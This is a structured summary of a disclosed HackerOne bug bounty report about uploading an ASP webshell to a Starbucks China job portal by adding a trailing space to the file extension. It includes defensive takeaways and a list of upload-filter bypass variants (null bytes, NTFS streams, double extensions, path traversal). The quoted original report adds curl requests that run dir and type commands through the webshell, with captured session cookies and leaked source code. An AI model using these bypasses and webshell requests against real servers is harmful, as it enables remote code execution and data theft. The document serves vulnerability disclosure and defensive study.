# Webshell via File Upload on ecjobs.starbucks.com.cn

## Metadata
- **Source:** HackerOne
- **Report:** 506646 | https://hackerone.com/reports/506646
- **Submitted:** 2019-03-08
- **Reporter:** johnstone
- **Program:** Starbucks
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Unrestricted File Upload, OS Command Injection, Insufficient File Type Validation, Remote Code Execution
- **CVEs:** None
- **Category:** memory-binary

## Summary
An authenticated attacker can bypass file upload restrictions on the resume avatar upload function by appending a space character to dynamic file extensions (e.g., 'asp '). This allows uploading and executing malicious webshell code that can execute arbitrary OS commands on the Windows server, leading to complete system compromise including source code disclosure, database access, and internal network intrusion.

## Attack scenario
1. Attacker authenticates to https://ecjobs.starbucks.com.cn and navigates to the resume upload endpoint
2. Attacker intercepts the avatar upload request using Burp Suite and modifies the filename extension from '.jpg' to 'asp ' (with trailing space)
3. Attacker modifies the file content to contain malicious ASP webshell code
4. Server's file validation logic fails to properly sanitize the extension due to the space character bypass, allowing the ASP file to be uploaded and saved in the web-accessible directory
5. Attacker accesses the uploaded webshell file and executes arbitrary OS commands through query parameters (e.g., ?getsc=dir)
6. Attacker gains complete command execution capability, enumerating directories, reading source code, accessing databases, and pivoting into internal network

## Root cause
The application implements insufficient file type validation that relies on simple extension checking without properly sanitizing whitespace. The validation logic likely uses string comparison or regex that does not account for trailing spaces, allowing 'asp ' to bypass the blacklist/whitelist filter while still being executed as a valid ASP file by the web server.

## Attacker mindset
An authenticated user seeking to escalate privileges from normal account access to full server compromise. The attacker recognizes that avatar uploads are typically less scrutinized than other file uploads and discovers through fuzzing or prior knowledge that whitespace can bypass extension filters. The goal is to obtain sensitive information (source code, database credentials) and establish persistent access.

## Defensive takeaways
- Implement strict file type validation using Content-Type headers verification AND magic number (file signature) validation, not just extension checking
- Normalize and sanitize all filenames by removing/trimming whitespace, special characters, and null bytes before validation and storage
- Use a whitelist approach (allow only specific safe extensions like .jpg, .png, .gif) rather than blacklist
- Store uploaded files outside the web root or in a directory configured to not execute scripts (disable script execution via web server configuration)
- Rename uploaded files to remove user control over extensions; generate safe filenames server-side
- Implement strict access controls limiting who can upload files and restrict upload directory permissions
- Configure web server (IIS in this case) to prevent execution of scripts in upload directories via web.config or IIS Manager settings
- Apply input validation on query parameters passed to webshell to prevent OS command injection even if upload succeeds
- Regularly audit file upload implementations and conduct security testing with fuzzing of edge cases (spaces, null bytes, alternate encoding)

## Variant hunting
Test null byte injection: 'file.asp%00.jpg' or 'file.asp\x00.jpg'
Test alternate whitespace characters: tabs, unicode spaces, newlines in extension
Test double extensions: 'file.asp.jpg' if server processes right-to-left
Test case variation: 'file.AsP', 'file.aSp' if filter is case-sensitive
Test other dynamic extensions on ASP.NET: '.ashx', '.asmx', '.asax'
Test NTFS alternate data streams on Windows: 'file.jpg::$DATA.asp'
Test path traversal in filename: '../shell.asp'
Test polyglot files combining valid image format with embedded ASP code
Test if other upload functions (profile picture, document upload) have same vulnerability
Test if authenticated users can upload files executable by other users with different permissions

## MITRE ATT&CK
- T1190
- T1190
- T1200
- T1059
- T1106
- T1505
- T1570
- T1570

## Notes
This is a high-impact vulnerability on a major corporate job portal exposing internal source code and server infrastructure. The proof-of-concept demonstrates successful execution of arbitrary commands (dir, type) revealing the internal application structure and sensitive code. The vulnerability chains two weaknesses: insufficient file upload validation and direct code execution via the web server. The trailing space bypass technique is a well-known evasion method that should have been caught in security testing. This appears to be reported in March 2019 against a Chinese Starbucks recruitment system.

## Full report
<details><summary>Expand</summary>

**Summary:** 
OS Command Injection which can let the attacker who get more important information of the server,such as disclosures internal source code of the webapp,database data and invade the internal network.

**Description:** 
I found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit.The attacker can run malicious cmd on the server.

## Steps To Reproduce:

  1. Sign in the url(https://ecjobs.starbucks.com.cn) and direct to the resume endpoint.
  2. Use burp suite tools to interupt the avatar upload request.
  3. Replace the filename type ```.jpg``` to ```asp ```which have a space character behind and modify the content

  After that you have uploaded malicious files on the server and run any os command on server you wanted.
Do some command like list all files on the server

```
curl -i -s -k  -X $'GET' \
    -H $'Host: ecjobs.starbucks.com.cn' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' \
    $'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=dir%20d:\\TrustHX\\STBKSERM101\\www_app%20%2fd%2fs%2fb'
```

**The response content:**

```
HTTP/1.1 200 OK
Date: Fri, 08 Mar 2019 02:56:19 GMT
Server: wswaf/2.13.0-5.el6
Content-Type: text/html
Cache-Control: private
X-Powered-By: ASP.NET
X-Via: 1.1 jszjsx51:1 (Cdn Cache Server V2.0), 1.1 PSjxncdx5rt58:6 (Cdn Cache Server V2.0)
Connection: close
Content-Length: 1814533

<html>
<body>
<h1>POC by hackerone_john stone</h1>
<textarea readonly cols=80 rows=25>
d:\TrustHX\STBKSERM101\www_app\bin
d:\TrustHX\STBKSERM101\www_app\common
d:\TrustHX\STBKSERM101\www_app\concurrent_test
d:\TrustHX\STBKSERM101\www_app\Default.aspx
d:\TrustHX\STBKSERM101\www_app\Global.asax
d:\TrustHX\STBKSERM101\www_app\hximages_v6
....................................
</textarea>
</body>
</html>
```

**Show the internal source code**
```
curl -i -s -k  -X $'GET' \
    -H $'Host: ecjobs.starbucks.com.cn' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: _ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'_ga=GA1.3.779308870.1546486037; ASP.NET_SessionId=w2dbbzgyv3cu0hiiwkysnooo; ASPSESSIONIDSSSBQTQR=FKJDKLGAKJKDALIKOJMJBLAF; ASPSESSIONIDSQRDSRRR=DLNDLPJANKNIAGPMFDEGFLIF' \
    $'https://ecjobs.starbucks.com.cn/recruitjob/tempfiles/temp_uploaded_739175df-5949-4bba-9945-1c1720e8e109.asp?getsc=type%20d:\\TrustHX\\STBKSERM101\\www_app\\concurrent_test\\new_application_concurrent_test__svc.cs'
```
the source code respones:
```
HTTP/1.1 200 OK
Date: Fri, 08 Mar 2019 03:37:39 GMT
Server: wswaf/2.13.0-5.el6
Content-Type: text/html
Cache-Control: private
X-Powered-By: ASP.NET
X-Via: 1.1 jszjsx51:0 (Cdn Cache Server V2.0), 1.1 ydx154:3 (Cdn Cache Server V2.0)
Connection: close
Content-Length: 33316

<html>
<body>
<h1>POC by hackerone_john stone</h1>
<textarea readonly cols=80 rows=25>
ï»¿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System;
using System.Collections.Specialized;
using System.Collections.Generic;
using System.Data;
using System.Configuration;
using System.Xml;
using System.Transactions;
using System.Text;
using System.Threading;
using System.Web;

using TrustHX.IHXEIMS6;
using hxsys = TrustHX.HXEIMS6;
using hxwww = TrustHX.HXWWW6;
using hxsm = TrustHX.HXSM6;
using hxmd = TrustHX.HXMD6;


class new_application_concurrent_test : IHXPageXmlService
{
    #region IHXPageXmlService æå
    string IHXPageXmlService.Run(string strSystemCode, string strPageXmlServiceCode, string strPageXmlServiceContent, string strHXPageParamUUID, string strHXPageName)
    {
        try
        {
            switch (strPageXmlServiceCode)
            {
                case "PREPARE_CONCURRENT_DATA":return ConcurrentDataPrepare.ConcurrentDataPrepareProcess(strSystemCode, strPageXmlServiceContent);
                case "CONCURRENT_TEST":return ConcurrentTest.ConcurrentTestProcess(strSystemCode, strPageXmlServiceContent);
                default:
                    string strErrorMessageText =
....................................
</textarea>
</body>
</html>
```

## Recommendations for fix

*Strictly limit file upload types
*Only allow jpg/png/gif/jpeg file parsing on the uploaded fiels
*More safe code design

Thks!Looking forward to your reply.
With kind regards
John stone

## Impact

disclosures  the internal source code data and user's information,broken ring server,etc.

</details>

---
*Analysed by Claude on 2026-05-24*
